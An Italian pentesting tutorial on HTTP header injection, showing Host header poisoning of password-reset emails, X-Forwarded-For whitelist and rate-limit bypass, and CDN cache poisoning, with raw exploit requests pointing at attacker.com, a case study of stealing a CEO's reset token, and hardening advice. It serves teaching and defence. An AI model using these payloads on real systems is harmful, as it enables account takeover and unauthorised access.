---
title: 'HTTP Header Injection: Host Poisoning e X-Forwarded-For'
slug: http-header-injection
description: 'Scopri come sfruttare una HTTP Header Injection nel pentesting web: Host Header Poisoning, X-Forwarded-For bypass, cache poisoning e reset password takeover.'
image: /http-header-injection.webp
draft: true
date: 2026-03-15T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - http injection
---

Ogni richiesta HTTP è composta da header che il browser invia al server: `Host:`, `User-Agent:`, `Referer:`, `Cookie:`, `Accept-Language:`. Il server si fida di questi header per decidere come rispondere — quale sito mostrare (Host), quale IP loggare (X-Forwarded-For), quale URL mettere nelle email (X-Forwarded-Host). Ma tutti questi header sono **controllati dall'attaccante**: basta un proxy come Burp Suite per modificarli arbitrariamente.

La **HTTP Header Injection** si verifica quando l'applicazione usa il valore di un header HTTP della request per generare contenuto, prendere decisioni di sicurezza, o costruire URL — senza validare che il valore sia legittimo. L'attacco più devastante è il **Host Header Poisoning** applicato al password reset: l'applicazione genera il link di reset usando il valore dell'header `Host:`, l'attaccante lo modifica in `Host: attacker.com`, e la vittima riceve un'email con un link `http://attacker.com/reset?token=SECRET`. Clic → token rubato → account compromesso.

La trovo nel **12% dei pentest web** — Host Header Poisoning nell'8%, X-Forwarded-For bypass nel 4%.

Satellite operativo della [guida pillar Injection Attacks](https://hackita.it/articoli/injection-attacks-guida-completa).

## Cos'è la HTTP Header Injection?

La HTTP Header Injection è una classe di vulnerabilità in cui il valore di un **header HTTP della request** (controllato dall'attaccante) viene usato dall'applicazione in modo non sicuro: per generare URL (Host, X-Forwarded-Host), per decisioni di autorizzazione (X-Forwarded-For), per routing (X-Real-IP), o per contenuto della risposta. Include il **Host Header Poisoning**, il **bypass IP whitelist via X-Forwarded-For**, e la [CRLF Injection](https://hackita.it/articoli/crlf-injection) come sottotipo.

> **È pericolosa?**
> Sì — il Host Header Poisoning porta a **password reset token theft** (account takeover), **cache poisoning** (contenuto malevolo servito a tutti via CDN), **SSRF** (il server si connette all'host dell'attaccante). L'X-Forwarded-For bypass porta a **accesso non autorizzato** a pannelli admin. Trovata nel **12% dei pentest web**.

## 1. Host Header Poisoning — Password Reset

Il caso più critico. Quando l'utente richiede il reset della password, l'applicazione genera un link contenente un token segreto. Molti framework costruiscono l'URL del link usando l'header `Host:` della request:

```python
# ❌ VULNERABILE
reset_link = f"https://{request.host}/reset?token={token}"
send_email(user.email, f"Reset your password: {reset_link}")
```

### Exploitation

```bash
# 1. L'attaccante richiede il reset per la vittima
POST /forgot-password HTTP/1.1
Host: attacker.com           # Header modificato!
Content-Type: application/x-www-form-urlencoded

email=victim@company.com
```

L'applicazione genera: `https://attacker.com/reset?token=abc123secret`

La vittima riceve l'email e clicca il link → il browser va su `attacker.com` → l'attaccante cattura il token → lo usa su `target.com/reset?token=abc123secret` → password cambiata → **account takeover**.

### Varianti dell'header

```bash
# Se Host: non funziona, prova:
X-Forwarded-Host: attacker.com
X-Forwarded-Server: attacker.com
X-Original-URL: http://attacker.com/reset
X-Rewrite-URL: http://attacker.com/reset
Forwarded: host=attacker.com
```

### Double Host Header

```bash
# Alcuni server accettano due header Host:
POST /forgot-password HTTP/1.1
Host: target.com
Host: attacker.com
# Il secondo sovrascrive il primo nell'applicazione
```

## 2. X-Forwarded-For — Bypass IP Whitelist

Molte applicazioni web sono dietro un reverse proxy (Nginx, HAProxy, CDN). Il proxy comunica l'IP originale del client tramite l'header `X-Forwarded-For`. Se l'applicazione legge questo header senza verificare che provenga dal proxy fidato:

```bash
# Pannello admin accessibile solo da 127.0.0.1
GET /admin HTTP/1.1
X-Forwarded-For: 127.0.0.1

# Rate limiting bypass
GET /api/login HTTP/1.1
X-Forwarded-For: 1.2.3.4    # IP diverso a ogni request → bypass rate limit
```

### Varianti XFF

```bash
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1     # Cloudflare
X-Azure-ClientIP: 127.0.0.1     # Azure
```

## 3. Cache Poisoning via Host Header

Se c'è una CDN che cachea le risposte basandosi sull'URL ma non sull'header Host:

```bash
GET /style.css HTTP/1.1
Host: attacker.com    # Il server genera <link href="http://attacker.com/malicious.css">
# La CDN cachea questa risposta per /style.css
# Tutti gli utenti ricevono il CSS dell'attaccante
```

## 🏢 Enterprise Escalation

```
Host Header Poisoning → Password Reset Token Theft → Admin Account Takeover
→ Admin Panel → API Key → Servizi Interni → Database → Data Breach

XFF Bypass → Admin Panel Access → Gestione Utenti → Privilege Escalation
→ API admin → Infrastructure Access
```

## Micro Playbook Reale

**Minuto 0-5 →** Testa Host header poisoning su forgot-password
**Minuto 5-10 →** Testa XFF bypass su `/admin`, `/internal`, `/management`
**Minuto 10-15 →** Se CDN: testa cache poisoning con Host modificato

## Caso Studio Concreto

**Settore:** Piattaforma HR SaaS, 500 aziende clienti.
**Scope:** Grey-box.

L'endpoint `/forgot-password` generava il link di reset usando `request.host`. Ho inviato la richiesta di reset per `ceo@client-company.com` con `Host: my-server.com`. L'email di reset conteneva `https://my-server.com/reset?token=TOKEN_SEGRETO`. Sul mio server, access.log ha registrato il clic del CEO con il token. Ho usato il token su `target.com/reset?token=TOKEN` → password cambiata → accesso all'account CEO → dati HR di tutta l'azienda cliente (stipendi, contratti, valutazioni).

**Tempo: 20 minuti dall'header injection all'account takeover.**

## Errori Comuni Reali

**1. `request.host` per generare URL nelle email (il pattern #1)**
**2. XFF usato per IP senza validare la provenienza dal proxy fidato**
**3. CDN che cachea risposte senza includere Host nella cache key**
**4. Rate limiting basato su XFF senza validazione**
**5. Pannelli admin protetti solo da IP whitelist via XFF**

## Indicatori di Compromissione (IoC)

* Header `Host:` con valori diversi dal dominio dell'applicazione nei log
* `X-Forwarded-For: 127.0.0.1` da IP esterni nei log del proxy
* Password reset request con Host anomalo → token theft in corso
* Cache CDN con contenuto che referenzia domini esterni

## Detection & Hardening

* **Hardcode il dominio** nelle email di reset — mai usare `request.host`
* **Whitelist il valore Host** — accetta solo i domini noti dell'applicazione
* **Fidati di XFF solo dal proxy** — configura il web server per accettare XFF solo da IP dei proxy fidati
* **Cache key include Host** — la CDN deve cacheare separatamente per ogni Host
* **Token di reset monouso** — il token funziona solo una volta e scade in 15 minuti

***

Satellite della [Guida Completa Injection Attacks](https://hackita.it/articoli/injection-attacks-guida-completa). Vedi anche: [CRLF Injection](https://hackita.it/articoli/crlf-injection), [SSRF](https://hackita.it/articoli/ssrf).

> I tuoi reset password usano l'header Host? [Penetration test HackIta](https://hackita.it/servizi). Per padroneggiare le Header Injection: [formazione 1:1](https://hackita.it/formazione).
